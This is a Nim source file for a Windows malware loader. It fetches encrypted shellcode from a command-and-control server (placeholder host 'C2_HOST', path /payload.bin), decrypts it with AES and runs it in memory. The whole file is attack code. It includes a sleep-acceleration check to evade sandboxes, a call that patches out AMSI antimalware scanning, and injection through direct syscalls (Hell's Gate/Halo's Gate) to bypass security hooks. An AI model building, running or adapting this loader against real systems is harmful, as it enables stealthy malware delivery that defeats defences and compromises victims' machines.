import winim
import winim/lean
import std/strutils
import amsi
import syscalls

# ── Configuration ──────────────────────────────────────────────────────────
const
  c2Host = "C2_HOST"
  c2Port = 443'u16
  c2Path = "/payload.bin"
  scKey  = "DEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEF"
  scIV   = "DEADBEEFDEADBEEFDEADBEEFDEADBEEF"

# ── WinHTTP bindings ───────────────────────────────────────────────────────
const
  WINHTTP_FLAG_SECURE                  = 0x00800000'u32
  WINHTTP_OPTION_SECURITY_FLAGS        = 31'u32
  SECURITY_FLAG_IGNORE_ALL_CERT_ERRORS = 0x3300'u32

type HINTERNET = pointer

proc WinHttpOpen(pszAgent: pointer; dwAccessType: uint32; pszProxy: pointer;
                 pszProxyBypass: pointer; dwFlags: uint32): HINTERNET
    {.stdcall, dynlib: "winhttp.dll", importc: "WinHttpOpen".}
proc WinHttpConnect(hSession: HINTERNET; pswzServerName: pointer;
                    nServerPort: uint16; dwReserved: uint32): HINTERNET
    {.stdcall, dynlib: "winhttp.dll", importc: "WinHttpConnect".}
proc WinHttpOpenRequest(hConnect: HINTERNET; pwszVerb: pointer;
                        pwszObjectName: pointer; pwszVersion: pointer;
                        pwszReferrer: pointer; ppwszAcceptTypes: pointer;
                        dwFlags: uint32): HINTERNET
    {.stdcall, dynlib: "winhttp.dll", importc: "WinHttpOpenRequest".}
proc WinHttpSendRequest(hRequest: HINTERNET; lpszHeaders: pointer;
                        dwHeadersLen: uint32; lpOptional: pointer;
                        dwOptionalLen: uint32; dwTotalLen: uint32;
                        dwContext: uint64): int32
    {.stdcall, dynlib: "winhttp.dll", importc: "WinHttpSendRequest".}
proc WinHttpReceiveResponse(hRequest: HINTERNET; lpReserved: pointer): int32
    {.stdcall, dynlib: "winhttp.dll", importc: "WinHttpReceiveResponse".}
proc WinHttpReadData(hRequest: HINTERNET; lpBuffer: pointer;
                     dwToRead: uint32; lpdwRead: ptr uint32): int32
    {.stdcall, dynlib: "winhttp.dll", importc: "WinHttpReadData".}
proc WinHttpSetOption(hInternet: HINTERNET; dwOption: uint32;
                      lpBuffer: pointer; dwBufferLength: uint32): int32
    {.stdcall, dynlib: "winhttp.dll", importc: "WinHttpSetOption".}
proc WinHttpCloseHandle(hInternet: HINTERNET): int32
    {.stdcall, dynlib: "winhttp.dll", importc: "WinHttpCloseHandle".}

# ── Helpers ────────────────────────────────────────────────────────────────
proc parseHexBytes(s: string): seq[byte] =
  let clean = s.replace(" ", "").replace(",", "").replace("0x", "")
  result = newSeq[byte](clean.len div 2)
  for i in 0 ..< result.len:
    result[i] = byte(parseHexInt(clean[i*2 .. i*2+1]))

proc aesDecrypt(data: var seq[byte]; key, iv: openArray[byte]) =
  var
    hAlg:     BCRYPT_ALG_HANDLE = nil
    hKey:     BCRYPT_KEY_HANDLE = nil
    cbResult: ULONG             = 0
    ivCopy                      = newSeq[byte](iv.len)
  copyMem(addr ivCopy[0], unsafeAddr iv[0], iv.len)

  discard BCryptOpenAlgorithmProvider(addr hAlg, BCRYPT_AES_ALGORITHM, nil, 0)
  var cbcMode = BCRYPT_CHAIN_MODE_CBC
  discard BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                            cast[PUCHAR](addr cbcMode), ULONG(sizeof(cbcMode)), 0)
  discard BCryptGenerateSymmetricKey(hAlg, addr hKey, nil, 0,
                                     cast[PUCHAR](unsafeAddr key[0]), ULONG(key.len), 0)
  discard BCryptDecrypt(hKey,
                        cast[PUCHAR](addr data[0]), ULONG(data.len), nil,
                        cast[PUCHAR](addr ivCopy[0]), ULONG(iv.len),
                        cast[PUCHAR](addr data[0]), ULONG(data.len),
                        addr cbResult, 0)
  BCryptDestroyKey(hKey)
  BCryptCloseAlgorithmProvider(hAlg, 0)
  data.setLen(cbResult.int)

# ── Sandbox evasion: accelerated-time detection ────────────────────────────
proc timingCheck() =
  let t0 = GetTickCount64()
  Sleep(5000)
  if GetTickCount64() - t0 < 4500:
    ExitProcess(0)

# ── Download encrypted shellcode via WinHTTP (HTTPS) ──────────────────────
proc toWide(s: string): seq[uint16] =
  result = newSeq[uint16](s.len + 1)
  for i in 0 ..< s.len:
    result[i] = uint16(s[i])

proc fetchShellcode(): seq[byte] =
  var hostW = toWide(c2Host)
  var verbW = toWide("GET")
  var pathW = toWide(c2Path)

  let hSession = WinHttpOpen(nil, 0'u32, nil, nil, 0'u32)
  if hSession == nil: ExitProcess(1)

  let hConnect = WinHttpConnect(hSession, addr hostW[0], c2Port, 0'u32)
  if hConnect == nil: ExitProcess(1)

  let hRequest = WinHttpOpenRequest(hConnect, addr verbW[0], addr pathW[0],
                                    nil, nil, nil, 0'u32)
  if hRequest == nil: ExitProcess(1)

  if WinHttpSendRequest(hRequest, nil, 0, nil, 0, 0, 0) == 0: ExitProcess(1)
  if WinHttpReceiveResponse(hRequest, nil) == 0: ExitProcess(1)

  var buf: array[4096, byte]
  var bytesRead: uint32 = 0
  while true:
    if WinHttpReadData(hRequest, addr buf[0], uint32(buf.len), addr bytesRead) == 0: break
    if bytesRead == 0: break
    result.add(buf.toOpenArray(0, int(bytesRead) - 1))

  discard WinHttpCloseHandle(hRequest)
  discard WinHttpCloseHandle(hConnect)
  discard WinHttpCloseHandle(hSession)

# ── Inject via direct syscalls (Hell's Gate + Halo's Gate) ────────────────
proc injectAndRun(shellcode: var seq[byte]) =
  let sc = initSyscalls()

  var
    base:       PVOID  = nil
    regionSize: SIZE_T = SIZE_T(shellcode.len)
    oldProt:    ULONG  = 0
    tid:        HANDLE = 0

  if sc.NtAllocateVirtualMemory(GetCurrentProcess(), addr base, 0,
                                 addr regionSize,
                                 MEM_COMMIT or MEM_RESERVE,
                                 PAGE_READWRITE) != 0:
    ExitProcess(1)

  copyMem(base, addr shellcode[0], shellcode.len)

  regionSize = SIZE_T(shellcode.len)
  if sc.NtProtectVirtualMemory(GetCurrentProcess(), addr base, addr regionSize,
                                PAGE_EXECUTE_READ, addr oldProt) != 0:
    ExitProcess(1)

  if sc.NtCreateThreadEx(addr tid, ACCESS_MASK(0x1FFFFF), nil,
                          GetCurrentProcess(), base, nil,
                          0, 0, 0, 0, nil) != 0:
    ExitProcess(1)

  discard sc.NtWaitForSingleObject(tid, FALSE, nil)

proc main() =
  timingCheck()
  patchAmsi()

  var sc = fetchShellcode()
  aesDecrypt(sc, parseHexBytes(scKey), parseHexBytes(scIV))
  injectAndRun(sc)

main()
